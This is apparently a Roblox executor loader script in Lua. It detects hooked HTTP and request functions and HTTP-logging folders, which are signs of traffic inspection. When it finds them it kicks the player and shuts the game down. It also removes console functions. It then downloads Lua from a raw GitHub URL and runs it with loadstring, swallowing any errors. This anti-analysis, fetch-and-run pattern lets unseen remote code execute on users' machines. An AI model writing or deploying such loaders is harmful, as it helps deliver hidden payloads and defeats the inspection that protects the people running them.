

local function selfDestruct(reason)
    pcall(function()
        for _, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
            if v:IsA("ScreenGui") then
                v.Enabled = false
            end
        end
    end)
    task.wait(0.5)
    pcall(function()
        game.Players.LocalPlayer:Kick("检测到抓包工具")
    end)
    pcall(game.Shutdown, game)
end

local function checkHooks()
    if not isfunctionhooked then
        return false
    end
    
    local safeChecks = {
        {func = game and game.HttpGet},
        {func = game and game.HttpPost},
        {func = tostring},
        {func = setclipboard},
        {func = request},
        {func = http_request},
    }
    for _, check in ipairs(safeChecks) do
        if check.func and isfunctionhooked(check.func) then
            return true
        end
    end
    if isfolder then
        local folders = {"HttpGetFolder", "WebhookFolder", "RequestFolder"}
        for _, folder in ipairs(folders) do
            if isfolder(folder) then
                return true
            end
        end
    end
    return false
end


for _, name in pairs({"rconsoleprint", "rconsolewarn", "rconsoleinfo", "rconsoleerr", "rconsoletitle", "clonefunction"}) do
    pcall(function()
        if getgenv() and getgenv()[name] ~= nil then
            getgenv()[name] = nil
        end
    end)
end


pcall(function()
    if isfunctionhooked then
        if checkHooks() then
            selfDestruct()
        else
            spawn(function()
                local startTime = os.clock()
                while os.clock() - startTime < 60 do
                    task.wait(2)
                    if checkHooks() then
                        selfDestruct()
                        break
                    end
                end
            end)
        end
    end
end)

pcall(function()
    local url = "https://raw.githubusercontent.com/czcasdfwdk/dyk-jzq-czc/main/dykjzqjzq2-czc.lua"
    local content = game:HttpGet(url, true)
    if content and type(content) == "string" and #content > 100 then
        local fn = loadstring(content)
        if fn then
            
            xpcall(fn, function(err)
                
            end)
        end
    end
end)
